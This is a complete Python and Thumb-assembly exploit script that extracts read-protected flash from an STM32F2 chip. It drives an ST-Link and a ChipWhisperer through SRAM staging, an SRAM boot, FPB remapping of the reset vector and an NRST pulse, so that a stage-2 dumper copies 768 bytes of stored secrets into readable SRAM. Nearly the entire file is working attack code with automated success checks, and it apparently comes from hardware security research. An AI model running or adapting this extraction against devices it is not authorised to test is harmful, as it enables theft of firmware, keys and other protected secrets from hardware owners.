#!/usr/bin/env python
"""h3_fpb_attack.py - Obermaier-H3 FPB flash extraction on F2 @ RDP1 (no glitch).

All primitives proven (see FINDINGS 2026-11-01): SRAM staging, remanence (caps,
<=50ms), SRAM-boot runs code, NRST preserves SRAM+FPB. This ties them together.

Sequence:
  1. SWD: stage stage1 (FPB configurator, SRAM-boot vectors @0x20000000) + stage2
     (flash dumper @0x20001000). Pre-fill scratch sentinel, clear markers.
  2. BOOT0=1(TIO1)+BOOT1=1(TIO2) = SRAM boot. Detach SWD.
  3. power-cycle ~30ms -> clears debug flash-lock; SRAM survives.
  4. SRAM-boot runs stage1 -> programs FPB to remap reset-vector fetch
     0x00000000->SP, 0x00000004->stage2; enables FPB; sets stage1-done; spins.
  5. CW: BOOT0=0 (flash boot); pulse NRST (SRAM + FPB survive a reset).
  6. boots "from flash" -> FPB redirects reset vector -> stage2 runs with flash
     ACCESSIBLE (flash-boot@RDP1 = normal op) -> copies 768B (chunks 0-2) -> scratch.
  7. SWD reconnect -> read scratch + markers, compare to storage.bin.

Non-destructive: SRAM + FPB regs + boot pins + power/reset. No flash/option writes.
"""
import os, sys, time, glob, fcntl, struct, subprocess, tempfile
import chipwhisperer as cw
from swd.stlink import Stlink
from swd.cortexm import CortexM

S1_BASE = 0x20000000        # stage1 (SRAM-boot entry)
REMAP   = 0x20000100        # FPB remap table (8 words) -> FP_REMAP = 0x100
S2_BASE = 0x20001000        # stage2 (flash dumper)
SCRATCH = 0x2000F000
S1_DONE = 0x2000EFF0; S1_DONE_VAL = 0x51A1E001
S2_DONE = 0x2000EFFC; S2_DONE_VAL = 0xD09ED09E
SENTINEL= 0xBADDC0DE
NWORDS  = 192               # 768 B = NORCOW chunks 0,1,2 (all secrets)
OPTCR   = 0x40023C14
OFF_MS  = 30
HERE    = os.path.dirname(os.path.abspath(__file__))

# stage1: SRAM-boot vector table + FPB config. Links @0x20000000.
STAGE1 = r'''
    .syntax unified
    .cpu cortex-m3
    .thumb
    .global _start
_start:
    .word 0x20010000            @ vector[0] SP
    .word s1+1                  @ vector[1] reset -> stage1
s1:
    ldr r0, =0xE0002004         @ FP_REMAP
    movs r1, #0x100             @ remap table offset -> 0x20000100
    str r1, [r0]
    ldr r0, =0x20000100         @ remap table
    ldr r1, =0x20010000
    str r1, [r0]                @ remap[0] (addr 0x0) -> SP
    ldr r1, =0x20001001         @ stage2 | thumb
    str r1, [r0, #4]            @ remap[1] (addr 0x4) -> stage2
    ldr r0, =0xE0002008         @ FP_COMP0
    movs r1, #1                 @ addr 0x0, REPLACE=00 remap, ENABLE=1
    str r1, [r0]
    movs r1, #5                 @ FP_COMP1: addr 0x4, remap, enable
    str r1, [r0, #4]
    ldr r0, =0xE0002000         @ FP_CTRL
    movs r1, #3                 @ KEY|ENABLE
    str r1, [r0]
    ldr r0, =0x2000EFF0         @ stage1-done marker
    ldr r1, =0x51A1E001
    str r1, [r0]
spin1:
    b spin1
    .ltorg
'''

# stage2: flash dumper. Links @0x20001000.
STAGE2 = r'''
    .syntax unified
    .cpu cortex-m3
    .thumb
    .global _start
_start:
    ldr r0, =0x20010000
    mov sp, r0
    ldr r0, =0x08008000         @ flash storage base
    ldr r1, =0x2000F000         @ scratch
    movs r2, #192               @ 192 words = 768 B
cp:
    ldr r3, [r0]                @ flash read (accessible now)
    str r3, [r1]
    adds r0, r0, #4
    adds r1, r1, #4
    subs r2, r2, #1
    bne cp
    ldr r0, =0x2000EFFC
    ldr r3, =0xD09ED09E
    str r3, [r0]
sp2:
    b sp2
    .ltorg
'''


def build(src, link):
    d = tempfile.mkdtemp(prefix='h3fpb_')
    s,o,e,b = (os.path.join(d,f) for f in ('a.s','a.o','a.elf','a.bin'))
    open(s,'w').write(src)
    subprocess.run(['arm-none-eabi-as','-mcpu=cortex-m3','-mthumb','-o',o,s], check=True)
    subprocess.run(['arm-none-eabi-ld',f'-Ttext={hex(link)}','-e','_start','-o',e,o], check=True)
    subprocess.run(['arm-none-eabi-objcopy','-O','binary',e,b], check=True)
    return open(b,'rb').read()


def usbreset():
    RST=(ord('U')<<8)|20
    for d in glob.glob('/sys/bus/usb/devices/*'):
        try:
            if open(d+'/idVendor').read().strip()=='0483' and open(d+'/idProduct').read().strip()=='3748':
                bb=int(open(d+'/busnum').read()); n=int(open(d+'/devnum').read())
                fd=os.open(f'/dev/bus/usb/{bb:03d}/{n:03d}',os.O_WRONLY); fcntl.ioctl(fd,RST,0); os.close(fd); return
        except OSError: continue


def connect():
    for i in range(5):
        try: return Stlink(swd_frequency=1800000)
        except Exception: usbreset(); time.sleep(0.6)
    raise SystemExit('swd down')


def wr_blob(st, base, blob):
    for i in range(0, len(blob), 4):
        st.set_mem32(base+i, struct.unpack('<I', blob[i:i+4].ljust(4,b'\0'))[0])


def main():
    gt = open(os.path.join(HERE,'storage.bin'),'rb').read()
    s1 = build(STAGE1, S1_BASE); s2 = build(STAGE2, S2_BASE)
    print(f'[+] stage1={len(s1)}B  stage2={len(s2)}B')

    s = cw.scope(); s.clock.clkgen_freq=16e6
    s.io.glitch_hp=False; s.io.glitch_lp=False
    s.io.tio1=False; s.io.tio2='high_z'; s.io.tio3='high_z'; s.io.tio4='high_z'
    s.io.target_pwr=False; time.sleep(0.5); s.io.target_pwr=True; time.sleep(1.0)
    st=connect(); cmx=CortexM(st); cmx.halt()
    print(f'[+] IDCODE=0x{st.get_idcode():08x} RDP=0x{(st.get_mem32(OPTCR)>>8)&0xff:02x}')

    print('[+] staging stage1 + stage2 + sentinel scratch')
    wr_blob(st, S1_BASE, s1)
    wr_blob(st, S2_BASE, s2)
    for w in range(NWORDS): st.set_mem32(SCRATCH+4*w, SENTINEL)
    st.set_mem32(S1_DONE, 0); st.set_mem32(S2_DONE, 0)
    assert st.get_mem32(S1_BASE)==0x20010000

    s.io.tio1=True; s.io.tio2=True            # SRAM boot
    print('[+] BOOT0=1,BOOT1=1 (SRAM boot). power-cycle %d ms' % OFF_MS)
    try: st.__del__()
    except Exception: pass
    s.io.target_pwr=False; time.sleep(OFF_MS/1000.0); s.io.target_pwr=True
    time.sleep(0.25)                           # stage1 runs, sets FPB, spins

    # now flip to flash boot and NRST (FPB + SRAM survive reset)
    print('[+] BOOT0=0 (flash boot), pulse NRST -> FPB redirect -> stage2')
    s.io.tio1=False; s.io.tio2=False
    time.sleep(0.02)
    s.io.tio4='gpio_low'; time.sleep(0.05); s.io.tio4='high_z'
    time.sleep(0.4)                            # stage2 runs

    st2=connect()
    d1 = st2.get_mem32(S1_DONE); d2 = st2.get_mem32(S2_DONE)
    out = b''.join(struct.pack('<I', st2.get_mem32(SCRATCH+4*w)) for w in range(NWORDS))
    print(f'[+] stage1-done = 0x{d1:08x} ({"OK" if d1==S1_DONE_VAL else "NOT SET"})')
    print(f'[+] stage2-done = 0x{d2:08x} ({"OK" if d2==S2_DONE_VAL else "NOT SET"})')
    print(f'    scratch head: {out[:16].hex()}')
    print(f'    flash truth : {gt[:16].hex()}')
    nsent = sum(1 for w in range(NWORDS) if struct.unpack('<I',out[4*w:4*w+4])[0]==SENTINEL)
    print(f'    still-sentinel: {nsent}/{NWORDS}')
    match = out[:NWORDS*4] == gt[:NWORDS*4]
    if match:
        o = os.path.join(HERE,'dumps','fpb_storage_0_2.bin'); os.makedirs(os.path.dirname(o),exist_ok=True)
        open(o,'wb').write(out)
        print(f'\n[VERDICT] *** FPB FLASH EXTRACTION WORKS *** 768B (chunks 0-2) dumped '
              f'byte-exact with NO glitch -> {o}')
        rc=0
    elif d2==S2_DONE_VAL:
        print('\n[VERDICT] stage2 ran but data wrong - flash still blocked after FPB '
              'redirect, or wrong addresses.')
        rc=1
    elif d1==S1_DONE_VAL:
        print('\n[VERDICT] stage1 set FPB but stage2 never ran -> FPB remap of the reset '
              'vector did not redirect (check FP_REMAP base / COMP encoding / NRST-FPB '
              'persistence).')
        rc=2
    else:
        print('\n[VERDICT] stage1 did not complete -> SRAM-boot/FPB-config path broke.')
        rc=3
    try: st2.__del__()
    except Exception: pass
    s.io.tio1=False; s.io.tio2='high_z'; s.io.target_pwr=False; s.dis()
    return rc


if __name__ == '__main__':
    try: sys.exit(main())
    except KeyboardInterrupt: sys.exit(1)
